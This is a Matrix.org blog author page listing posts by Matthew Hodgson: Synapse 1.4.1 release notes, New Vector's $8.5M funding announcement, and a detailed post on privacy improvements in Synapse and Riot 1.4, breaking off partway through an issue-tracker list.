<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="twitter:widgets:csp" content="on" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="twitter:site" content="@matrixdotorg" />
    <meta name="twitter:creator" content="@matrixdotorg" />

    <title>Matrix.org - Matthew Hodgson</title>
    <link rel="shortcut icon" href="/assets/favicon.ico" />
    <link rel="icon" type="image/png" href="/assets/favicon.png" />
    <link rel="stylesheet" href="/style.css" />

    
<link rel="alternate" type="application/rss+xml" title="RSS" href="/author/matthew-hodgson/atom.xml">
</head>

<body>
    
    <header class="site-header">
    <a href="/" class="brand">
        <img src="/images/matrix-logo-white.svg" alt="Matrix logo">
    </a>
    <input id="site-header-dropdown-checkbox" type="checkbox" class="dropdown-checkbox" aria-hidden="true">
    <label for="site-header-dropdown-checkbox" class="dropdown-button">&#xe602;</label>
    <label for="site-header-dropdown-checkbox" class="page-overlay"></label>
    <nav>
        
        
        <a href="&#x2F;about&#x2F;" class="
            ">
            About
        </a>
        
        
        
        <a href="&#x2F;blog&#x2F;" class="
            ">
            Blog
        </a>
        
        
        
        
        
        <details  class="section-wrap mobile">
            <summary class="section ">
                Documentation
                <div class="arrow"></div>
            </summary>
            <div class="section-submenu-wrap">
                <div class="section-submenu">
                    
                    
                    
                    <a href="&#x2F;docs&#x2F;users&#x2F;">Users</a>
                    
                    
                    <a href="&#x2F;docs&#x2F;communities&#x2F;">Communities</a>
                    
                    
                    <a href="&#x2F;docs&#x2F;developers&#x2F;">Developers</a>
                    
                    
                    <a href="&#x2F;docs&#x2F;legacy&#x2F;">Legacy documentation</a>
                    
                </div>
            </div>
        </details>
        <div class="section-wrap desktop">
            <a href="&#x2F;docs&#x2F;" class="section ">
                Documentation
            </a>
            <div class="section-submenu-wrap">
                <div class="section-submenu">
                    
                    
                    
                    <a href="&#x2F;docs&#x2F;users&#x2F;">Users</a>
                    
                    
                    <a href="&#x2F;docs&#x2F;communities&#x2F;">Communities</a>
                    
                    
                    <a href="&#x2F;docs&#x2F;developers&#x2F;">Developers</a>
                    
                    
                    <a href="&#x2F;docs&#x2F;legacy&#x2F;">Legacy documentation</a>
                    
                </div>
            </div>
        </div>
        
        
        
        
        
        <details  class="section-wrap mobile">
            <summary class="section ">
                Ecosystem
                <div class="arrow"></div>
            </summary>
            <div class="section-submenu-wrap">
                <div class="section-submenu">
                    
                    <a href="&#x2F;ecosystem&#x2F;clients&#x2F;">Clients</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;servers&#x2F;">Servers</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;bots&#x2F;">Bots</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;bridges&#x2F;">Bridges</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;sdks&#x2F;">SDKs</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;hosting&#x2F;">Hosting</a>
                    
                    
                </div>
            </div>
        </details>
        <div class="section-wrap desktop">
            <a href="&#x2F;ecosystem&#x2F;" class="section ">
                Ecosystem
            </a>
            <div class="section-submenu-wrap">
                <div class="section-submenu">
                    
                    <a href="&#x2F;ecosystem&#x2F;clients&#x2F;">Clients</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;servers&#x2F;">Servers</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;bots&#x2F;">Bots</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;bridges&#x2F;">Bridges</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;sdks&#x2F;">SDKs</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;hosting&#x2F;">Hosting</a>
                    
                    
                </div>
            </div>
        </div>
        
        
        
        <a href="&#x2F;podcasts&#x2F;" class="
            ">
            Podcasts
        </a>
        
        
        
        <a href="https:&#x2F;&#x2F;shop.matrix.org" class="
            ">
            Shop
        </a>
        
        
        
        <a href="&#x2F;try-matrix&#x2F;" class="primary
            ">
            Try Matrix
        </a>
        
        
    </nav>
</header>


    <main>
        
<div id="taxonomy-single">
    <div class="content">
        <header>
            <h1>Matthew Hodgson</h1>
            146 posts tagged with "Matthew Hodgson" <a href="/author">(See all Author)</a>
            
        </header>

        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;10&#x2F;18&#x2F;synapse-1-4-1-released&#x2F;" title="Synapse 1.4.1 released">Synapse 1.4.1 released</a></h2>
                <span>
                    18.10.2019 00:00
                    —
                    <a href="/category/releases">
                        Releases
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>We've released Synapse 1.4.1 as a small but important bugfix to 1.4.0.</p>
<p>This fixes a regression which crept in with our newly implemented &quot;erase redacted data after N days&quot; feature where some APIs
would fail when hitting erased redactions - anyone on Synapse 1.4.0 will want to upgrade asap.</p>
<p>As always, you can get the new update <a href="https://github.com/matrix-org/synapse/releases/tag/v1.4.1">here</a> or any of the sources mentioned at <a href="https://github.com/matrix-org/synapse">https://github.com/matrix-org/synapse</a>. Also, check out our <a href="https://matrix.org/docs/guides/installing-synapse">Synapse installation guide page</a></p>
<p>The changelog since 1.4.0 follows:</p>
<h1 id="synapse-1-4-1-2019-10-18">Synapse 1.4.1 (2019-10-18)</h1>
<p>No changes since 1.4.1rc1.</p>
<h1 id="synapse-1-4-1rc1-2019-10-17">Synapse 1.4.1rc1 (2019-10-17)</h1>
<h2 id="bugfixes">Bugfixes</h2>
<ul>
<li>Fix bug where redacted events were sometimes incorrectly censored in the database, breaking APIs that attempted to fetch such events. (<a href="https://github.com/matrix-org/synapse/issues/6185">#6185</a>, <a href="https://github.com/matrix-org/synapse/commit/5b0e9948eaae801643e594b5abc8ee4b10bd194e">5b0e9948</a>)</li>
</ul>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;10&#x2F;10&#x2F;new-vector-raises-8-5m-to-accelerate-matrix-riot-modular&#x2F;" title="New Vector raises $8.5M to accelerate Matrix&#x2F;Riot&#x2F;Modular">New Vector raises $8.5M to accelerate Matrix&#x2F;Riot&#x2F;Modular</a></h2>
                <span>
                    10.10.2019 00:00
                    —
                    <a href="/category/in-the-news">
                        In the News
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Massive news for the Matrix ecosystem today: <a href="https://vector.im">New Vector</a> (the
startup which the Matrix core team formed to fund development in 2017) has
raised an additional $8.5M of funding in order to speed up Riot/Matrix
development and expand Matrix hosting via <a href="https://modular.im">Modular.im</a>!</p>
<p>The new funding comes in the form of a Series-A equity investment in New
Vector from three of the top venture capital funds in London.  The round is
led by <a href="https://notion.vc">Notion</a> - a fund set up by the founders of
MessageLabs, who many will know as one of the leaders in secure hosted email
services.  Notion's long history with email means they immediately clocked the
potential of Matrix's mission to build a new open global communication network -
after all, Matrix aims to provide a worthy replacement to email (and the
phone network, for that matter!).  Joining Notion in the round is <a href="https://firstminute.capital">First
Minute</a> - a fund set up by the founders of
Lastminute.com (arguably the UK's most famous original dotcom), and
<a href="http://dawncapital.com/">Dawn</a> - one of the largest SaaS tech specialist
funds in Europe (famous for backing iZettle, Mimecast, Neo4J and many more).</p>
<p>The last funding round in Jan 2017 from Status was instrumental in stabilising
the big 1.0 release of Matrix and exiting beta in June; creating the
Matrix.org Foundation as a neutral custodian for the standard; stabilising and
optimising Synapse; redesigning Riot’s user interface; bringing in a full-time
professional UI/UX designer to the team; supporting the huge amount of
encryption work required to turn on E2EE by default (cross-signing, key
backups, device verification, e2e search, the pantalaimon e2e daemon etc);
creating RiotX/Android; and launching the Modular.im hosting platform.</p>
<p>With today’s new funding, the priorities for Matrix will be:</p>
<ul>
<li>
<p>Turning on end-to-end encryption by default for DMs</p>
</li>
<li>
<p>Much better support for grouping rooms into Communities</p>
</li>
<li>
<p>More anti-abuse/anti-spam mechanisms</p>
</li>
<li>
<p>Shrinking Synapse (and/or finishing Dendrite)</p>
</li>
<li>
<p>Canonical DMs (having one DM per user, and have them feel clearly distinct from ‘rooms’)</p>
</li>
<li>
<p>Extensible Profiles</p>
</li>
<li>
<p>Decentralised accounts</p>
</li>
<li>
<p>Threading</p>
</li>
<li>
<p>...and furthering development on P2P Matrix, so users can have full control of their communications without having to run or trust a server.</p>
</li>
</ul>
<p>On the New Vector side, this funding will support: </p>
<ul>
<li>
<p>A whole new wave of UX improvements to Riot (particularly around onboarding and first time user experience).</p>
</li>
<li>
<p>Making Modular hosting as polished and powerful as possible.</p>
</li>
<li>
<p>Creating a whole new set of next-generation Modular integrations.</p>
</li>
</ul>
<p>While New Vector’s contributions to the Matrix ecosystem can’t be ignored,
it’s important to remember that the Matrix protocol and specification itself
is governed and controlled by the independent and neutral <a href="https://matrix.org/foundation">Matrix.org
Foundation</a> and its <a href="https://github.com/matrix-org/matrix-doc/blob/master/proposals/1779-open-governance.md">extensive governance
processes</a>.
We set up the Foundation <em>very</em> deliberately to enforce the protocol's
neutrality, formalise the project's mission, goals and values and hold true to
them no matter what - specifically to protect the project from conflicts of
interest with commercial Matrix endeavours, including New Vector.</p>
<p>That said, New Vector would not be taking money from any investors if they did
not believe their goals are aligned with Matrix's. To clarify:</p>
<ul>
<li>Matrix exists to create an open secure decentralised communication network and protocol for the benefit of all.</li>
<li>New Vector exists to help grow Matrix and be one of many successful companies in the Matrix ecosystem. </li>
<li>Tech VCs exist to invest their money in growing companies in order to get a return when the company IPOs or gets bought.</li>
</ul>
<p>It turns out that these goals are not incompatible if one understands that the
potential of the Matrix ecosystem is directly linked to its openness and size
(hint: funding sources who didn’t understand this self-selected out ;). By
funding Matrix development and helping the open ecosystem and public network
grow, New Vector can go provide more Matrix hosting via
<a href="https://modular.im">Modular.im</a> and more Government &amp; Enterprise deployments
via <a href="https://vector.im">Vector.im</a>.  Critically, other companies can and do
build on top of Matrix too - and frankly the more players there are, the more
valuable the network, and the more value to be shared for everyone (including
New Vector).  This model worked relatively well for the Web, and we believe
it'll work for Matrix too.</p>
<p><strong>Update: the best way to gauge the investment in New Vector is to hear it
first hand from the investors.  Jos from Notion is leading the round, and has
a <a href="https://notion.vc/resources/new-vector-series-a/">fascinating blog post</a>
(written with zero input from Matrix or New Vector folks) to explain where the
investors are coming from.</strong></p>
<p><strong>Update 2: More excellend <a href="https://medium.com/dawn-capital/communications-of-the-future-will-be-open-and-secure-why-we-invested-in-new-vector-2bd8a060faf7">first-hand analysis</a> from Dan at Dawn Capital, who does a really deep dive into how they see Matrix and New Vector. Another must read.</strong></p>
<p>In this case, all of New Vector's new investors have a background as respected
tech entrepreneurs, and everyone involved categorically understands that
Matrix itself is a neutral open source project, and the mission is to help
build up the whole network to be as successful as possible rather than
sabotage it by constraining it in any way.</p>
<p>All in all, it’s great news for the ecosystem: Matrix is 5 years old now, and
while the project is growing faster than ever (over 300% more active users in
the last year!) - it's fair to say that we haven't moved as fast as our
mainstream competition - for instance, Slack is only a year older, and Discord
is a year younger(!)  Obviously much of this is due to Matrix being a
completely different proposition: we've been creating an open spec; multiple
client codebases; multiple server codebases; the bridges; a fault tolerant
decentralised network - not to mention the complexities of decentralised E2E
encryption.  Based on comparing with our endeavours prior to Matrix, we
estimate building this stuff in an open and decentralised manner takes roughly
6 times longer.</p>
<p>But the project is now in a position where the foundations are solid: the
protocol is out of beta, reference servers and clients are production ready,
and it’s more than time to make all of this mainstream. We have to redouble
our focus on user experience and ensure that we compare favourably to today’s
established alternatives while staying true to Matrix’s principles.  Making
sure there are Matrix apps out there which provide a credible alternative to
with the likes of Slack and WhatsApp (until they eventually join Matrix, of
course) is what will make the difference between Matrix being a cliquey FOSS
curiosity versus really being the natural successor to today’s instant
messaging, email and phone networks.</p>
<p>In the end; Matrix needs full-time contributors in order to continue to grow,
and keeping New Vector funded is a very good way to achieve that (<a href="https://vector.im/careers">New Vector
is hiring!</a>).  (That said, if any philanthropic
billionaires are reading this, the Matrix.org Foundation is actively
soliciting donations to improve Matrix independently of New Vector's efforts -
particularly around the areas of countering online abuse and disinformation).</p>
<p>In the meantime, huge thanks to Jos at Notion for believing in Matrix and
leading this funding round in New Vector - and huge thanks to the other
investors who saw the potential!  And most of all, thank you to all those
supporting Matrix, whether by donating to the Foundation, promoting and using
the protocol, or contributing code to the ecosystem.  You are the ones keeping
the dream alive :)</p>
<p>You can read things from the NV angle over at https://blog.vector.im/8-5m-to-accelerate-matrix/.
We hope you’re as excited as we are to open a whole new chapter as Matrix
picks up yet more momentum :D</p>
<p>-- Matthew, Amandine, and the whole Matrix team</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;09&#x2F;27&#x2F;privacy-improvements-in-synapse-1-4-and-riot-1-4&#x2F;" title="Privacy improvements in Synapse 1.4 and Riot 1.4">Privacy improvements in Synapse 1.4 and Riot 1.4</a></h2>
                <span>
                    27.09.2019 00:00
                    —
                    <a href="/category/privacy">
                        Privacy
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Back in June we wrote about our <a href="https://matrix.org/blog/2019/06/30/tightening-up-privacy-in-matrix">plans to tighten up data
privacy</a>
in Matrix after some areas for improvement were brought to our attention.  To
quickly recap: the primary concern was that the default config for Riot
specifies identity servers and integration managers run by New Vector (the
company which the original Matrix team set up to build Riot and fund Matrix
dev) - and so folks using a standalone homeserver may end up using external
services without realising it.  There were some other legitimate issues raised
too (e.g. contact information should be obfuscated when checking if your
contacts are on Matrix; Riot defaulted to using Google for STUN (firewall
detection) if no TURN server had been set up on their server; Synapse defaults
to using matrix.org as a key notary server).</p>
<p>We’ve been working away at this fairly solidly over the last few months.  Some
of the simpler items shipped quickly (e.g. Riot/Web had a <a href="https://github.com/matrix-org/matrix-react-sdk/pull/3115">stupid
bug</a> where it kept
incorrectly loading the integration manager; Riot/Android <a href="https://news.ycombinator.com/item?id=20181515">wasn’t clear
enough</a> about when contact
discovery was happening; Riot/Web <a href="https://github.com/vector-im/riot-web/issues/10216">wasn’t clear
enough</a> about the fact
device names are publicly visible; etc) - but other bits have turned out to be
incredibly time-consuming to get right.</p>
<p>However, we’re in the process today of releasing Synapse 1.4.0 and Riot/Web
1.4.0 (it’s coincidence the version numbers have lined up!) which resolve the
majority of the remaining issues.  The main changes are as follows:</p>
<ol>
<li>
<p><strong>Riot no longer automatically uses identity servers by default</strong>.
Identity servers are only useful when inviting users by email address, or when
discovering whether your contacts are on Matrix.  Therefore, we now wait until
the user tries to perform one of these operations before explaining that they
need an identity server to do so, and we prompt them to select one if they
want to proceed. This makes it abundantly clear that the user is connecting to
an independent service, and why.</p>
</li>
<li>
<p><strong>Integration Managers and identity servers now have the ability to force
users to accept terms of use before using them</strong>.  This means they can
explicitly spell out the data privacy &amp; usage policy of the server as required
by GDPR, and it should now be impossible for a user to use these services
without realising it.  This was particularly fun in the case of identity
servers, which previously had no concept of users and so couldn’t track
whether users had agreed to their terms &amp; conditions or not… and because
homeservers sometimes talk to the identity server on behalf of users rather
than the user talking direct, the privacy policy flow gets even hairier.  But
it’s solved now, and a nice side-effect of this is that users can now
explicitly select their Integration Manager in Riot, in case they want to use
<a href="https://dimension.t2bot.io">Dimension</a> or similar rather than the default
provided by <a href="https://modular.im">Modular</a>.</p>
</li>
<li>
<p><strong>Synapse no longer uses identity servers for verifying registrations or
verifying password reset.</strong> Originally, Synapse made use of the fact that the
Identity Service contains email/msisdn verification logic to handle identity
verification in general on behalf of the homeserver. However, in retrospect
this was a mistake: why should the entity running your identity server have
the right to verify password resets or registration details on your
homeserver?  So, we have moved this logic into Synapse.  <strong>This means Synapse
1.4.0 requires new configuration for email/msisdn verification to work -
please see the upgrade notes for full details.</strong></p>
</li>
<li>
<p><strong>Sydent now supports discovering contacts based on hashed identifiers.</strong>
<a href="https://github.com/matrix-org/matrix-doc/blob/hs/hash-identity/proposals/2134-identity-hash-lookup.md">MSC2134</a>
specifies entirely new IS APIs for discovering contacts using a hash of their
identifier rather than directly exposing the raw identifiers being searched
for.  This is implemented in
<a href="https://github.com/vector-im/riot-ios/issues/2652">Riot/iOS</a> and
<a href="https://github.com/vector-im/riot-android/issues/3257">Riot/Android</a> and
should be in the next major release;
<a href="https://github.com/vector-im/riot-web/issues/10556">Riot/Web</a> 1.4.0 has it
already.</p>
</li>
<li>
<p>Synapse now <a href="https://github.com/matrix-org/synapse/pull/6090/files">warns in its
logs</a> if you are using
matrix.org as a default trusted key server, in case you wish to use a
different server to help discover other servers’ keys.</p>
</li>
<li>
<p>Synapse now <a href="https://github.com/matrix-org/synapse/issues/1287">garbage collects redacted
messages</a> after N days (7
days by default).  (It doesn’t yet garbage collect attachments referenced from
redacted messages; we’re still working on that).</p>
</li>
<li>
<p>Synapse now <a href="https://github.com/matrix-org/synapse/pull/6098/files">deletes account access
data</a> (IP addresses and
User Agent) after N days (28 days by default) of a device being deleted.</p>
</li>
<li>
<p>Riot warns before falling back to using STUN (and defaults to
turn.matrix.org rather than stun.google.com) for firewall discovery (STUN)
when placing VoIP calls, and makes it clear that this is an emergency fallback
for misconfigured servers which are missing TURN support.  (We originally
deleted the fallback entirely, but this broke things for too many people, so
we’ve kept it but warn instead).</p>
</li>
</ol>
<p>All of this is implemented in Riot/Web 1.4.0 and Synapse 1.4.0.  Riot/Web
1.4.0 shipped today (Fri Sept 27th) and we have a release candidate
for Synapse 1.4 (1.4.0rc1) today which fully ship on Monday.</p>
<p>For full details please go check out the <a href="https://medium.com/@RiotChat/new-privacy-controls-for-riot-dc3661888563">Riot 1.4.0</a>
and <a href="https://matrix.org/blog/2019/10/03/synapse-1-4-0-released">Synapse 1.4.0</a> blog posts.</p>
<p>Riot/Mobile is following fast behind - most of the above has been implemented
and everything should land in the next release.  RiotX/Android doesn’t really
have any changes to make given it hadn’t yet implemented Identity Service or
Integration Manager APIs.</p>
<p>This has involved a surprisingly large amount of spec work; no fewer than 9
new Matrix Spec Changes (MSC) have been required as part of the project.  In
particular, this results in a massive update to the Identity Service API,
which will be released very shortly with the new MSCs.  You can see the
upcoming changes on the <a href="https://matrix.org/docs/spec/identity_service/unstable">unstable
branch</a> and compare
with the <a href="https://matrix.org/docs/spec/identity_service/r0.2.1">previous 0.2.1 stable
release</a>, as well as
checking the detailed MSCs as follows:</p>
<ul>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/1961">MSC1961: Integration manager authentication APIs</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2078">MSC2078: Sending Third-Party Request Tokens via the Homeserver</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2134">MSC2134: Identity Hash Lookups</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2140">MSC2140: Terms of Service for ISes and IMs</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2229">MSC2229: Allowing 3PID Owners to Rebind</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2230">MSC2230: Store Identity Server in Account Data</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2263">MSC2263: Give homeservers the ability to handle their own 3PID registrations/password resets</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2264">MSC2264: Add an unstable feature flag to MSC2140 for clients to detect support</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2290">MSC2290: Separate Endpoints for Threepid Binding</a></li>
</ul>
<p>This said, there is still some work remaining for us to do here.  The main
things which haven’t made it into this release are:</p>
<ul>
<li>Preferring to get server keys from the source server rather than the notary server by default (<a href="https://github.com/matrix-org/synapse/pull/6110">https://github.com/matrix-org/synapse/pull/6110</a>). This almost made it in, but we need to test it more first - until then, your specified notary server will see roughly what servers your servers are trying to talk to.  In future this will be mitigated properly by <a href="https://github.com/matrix-org/matrix-doc/issues/1228">MSC1228 (removing mxids from events)</a>.</li>
<li>Configurable data retention periods for rooms.  We are tantalisingly close with this - <a href="https://github.com/matrix-org/synapse/pull/5815">https://github.com/matrix-org/synapse/pull/5815</a> is an implementation that the French Govt deployment is using; we need to port it into mainline Synapse.</li>
<li>Authenticating access to the media repository - for now, we still rely on media IDs being almost impossible to guess to protect the data rather than authenticating the user.</li>
<li>Deleting items from the media repository - we still need to hook up deletion APIs.</li>
<li>Garbage collecting forgotten rooms.  If everyone leaves &amp; forgets a room, we should delete it from the DB.</li>
<li><a href="https://github.com/matrix-org/matrix-doc/issues/1280">Communicating erasure requests over federation </a></li>
</ul>
<p>We’ll continue to work on these as part of our ongoing maintenance backlog.</p>
<p>Separately to the data privacy concerns, we’ve had a <a href="https://news.ycombinator.com/item?id=20515069">separate wave of
feedback</a> regarding how we
handle GDPR Data Subject Access Requests (DSARs). Particularly: whether DSAR
responses should contain solely the info your have directly keyed by the
requesting Matrix ID - or if we should provide all the data “visible” to that
ID (i.e. the history of the conversations they’ve been part of).  We went and
got professional legal advice on this one, and the conclusion is that we
should keep our responses to DSARs as tightly scoped as possible. We <a href="https://github.com/vector-im/policies/pull/7/files?short_path=09dc019#diff-09dc019b94b6efb90fa9f6e5c836f310">updated
Matrix.org’s privacy
policy</a>
and DSAR tools to reflect the new legal input.</p>
<p>Finally, it’s really worth calling out the amount of effort that went into
this project. Huge huge thanks to everyone involved (given it’s cut across
pretty much every project &amp; subteam we have working on the core of Matrix) who
have soldiered through the backlog.  We’ve been tracking progress using our
<a href="https://github.com/vector-im/feature-dashboard">feature-dashboard</a> tool which
summarises Github issues based on labels &amp; issue lifecycle, and for better or
worse it’s ended up being the biggest project board we’ve ever had.  You can
see the live data
<a href="https://vector-im.github.io/feature-dashboard/#/plan?label=privacy-sprint&amp;repo=vector-im/riot-web&amp;repo=vector-im/riot-ios&amp;repo=vector-im/riot-android&amp;repo=vector-im/riotX-android&amp;repo=matrix-org/matrix-doc&amp;repo=matrix-org/sydent&amp;repo=matrix-org/synapse">here</a>
(warning, it takes tens of seconds to spider Github to gather the data) - or,
for posterity and ease of reference, I’ve included the current issue list
below.  The issues which are completed have “done” after them; the ones still
in progress say “in progress”, and ones which haven’t started yet have
nothing. We split the project into 3 phases - phases 1 and 2 represent the
items needed to fully solve the privacy concerns, phase 3 is right now a mix
of &quot;nice to have&quot; polish and some more speculative items.  At this point we’ve
effectively finished phase 1 on Synapse &amp; Riot/Web, and Riot/Mobile is
following close behind.  We're continuing to work on phase 2, and we’ll work
through phase 3 (where appropriate) as part of our general maintenance
backlog.</p>
<p>I hope this gives suitable visibility on how we’re considering privacy; after
all, Matrix is useless as an open communication protocol if the openness comes
at the expense of user privacy.  We’ll give another update once the remaining
straggling issues are closed out; and meanwhile, now the bulk of the privacy
work is out of the way on Riot/Web, we can <strong>finally</strong> get back to
implementing the UI E2E cross-signing verification and improving first time
user experience.</p>
<p>Thanks for your patience and understanding while we’ve sorted this stuff out;
and thanks once again for flying Matrix :)</p>
<p><em>In the absence of comments on the current blog, please feel free to discuss
over at <a href="https://news.ycombinator.com/item?id=21091908">HN</a>, or alternatively come ask stuff in
our AMA over at
<a href="https://www.reddit.com/r/privacy/comments/da219t/im_project_lead_for_matrixorg_the_open_protocol/">/r/privacy</a>
(starting ~5pm GMT+1 (UK) on Friday Sept 27th).</em></p>
<h3 id="the-privacy-project-dashboard-of-doom">The Privacy Project Dashboard Of Doom</h3>
<ul>
<li>phase:1
<ul>
<li>vector-im/riot-web
<ul>
<li><a href="https://github.com/vector-im/riot-web/issues/5846">5846 Riot duplicates calls to Scalar</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/5921">5921 Ability to disable all identity server functionality via the config file</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/6802">6802 riot shouldn't try to load integrations from an integration manager unless the user has accepted that manager's privacy policies</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10088">10088 Prompt to accept integration manager polices on use</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10090">10090 Make sure there are no ugly edge cases running Riot without an integrations manager</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10091">10091 Decouple setting an email for password reset from publishing your threepid to the identity server and support choice of identity server (on registration)</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10092">10092 Prompt to accept Identity Server policies on registration</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10093">10093 Prompt to accept identity server policies before inviting them to a room</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10094">10094 Store identity server in Account Data and support choosing identity server integration in User Settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10159">10159 Enable toggling a threepid's association with the current IS in User Settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10173">10173 VoIP: Stop falling back to Google for STUN</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10216">10216 We should make it clear in the UI that device names are publicly readable</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10386">10386 Terms modal prompt should appear without a flash of the integration manager portal first</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10408">10408 Identity server v2 API authentication</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10423">10423 Deploy a develop environment for t's and c's flows for IM and IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10424">10424 Remove the bind true flag from 3PID calls on registration</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10425">10425 Ability to disconnect from the identity server by pressing buttons in user settings.</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10452">10452 Test IS v2 access tokens for validity</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10497">10497 Integration manager terms hides terms that need signing</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10510">10510 Remove the bind true flag from 3PID adds in settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10519">10519 Update discovery and account 3PID sections when either changes</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10522">10522 Handle terms agreement in the Discovery section of settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10525">10525 IS interactions proxied through the HS also need terms agreement</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10528">10528 don't try &amp; show threepids in discovery section if we don't have an ID server</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10539">10539 Inline terms agreement on change IS and IM</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10540">10540 When using Riot without an IS, identity requests are sent to server hosting Riot</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10546">10546 Prompt for fallback VOIP should only happen when the user tries to make a call</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10550">10550 warn when disconnecting ID server if there are any current bindings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10552">10552 Allow email registration, password reset &amp; adding 3pids when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10553">10553 Remove the ability to set an IS at login/registration</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10556">10556 Use the hashed v2 lookup API for 3PIDs</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10561">10561 Scalar should serve a .well-known file</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10566">10566 Use nicer APIs for toggling a 3PID's shared status</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10571">10571 Allow email registration when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10572">10572 Allow password reset when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10573">10573 Allow adding 3pids when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10574">10574 Placeholder issue for MSCs that should land prior to the privacy release</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10593">10593 Placeholder issue for privacy migration path</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10597">10597 Ensure IS in account data is read / written as specced</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10599">10599 Send IS for adding MSISDNs only when required by HS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10603">10603 Getting a terms prompt when inviting an email address clears the address picker</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10619">10619 Handle the case of no IS in features that require IS to lookup</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10620">10620 Change auth flows so that you default to no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10634">10634 Changing to vector.im IS in Settings fails because /terms 404s</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10635">10635 Inline terms agreement in Discovery should still show change and do not use</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10636">10636 The UX is a little confusing if you haven't accepted the terms of the default identity server.</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10637">10637 Unable to add email address to HS account without IS set</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10660">10660 Sydent implementation: Unauthed v1, clone all endpoints, auth v2</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10666">10666 In login/register, riot freezes if you go to Advanced, remove the IS url and click next</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10669">10669 Checking email invite account is unclear when no IS set</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10674">10674 Email help text on registration should be updated without binding</a> (done)</li>
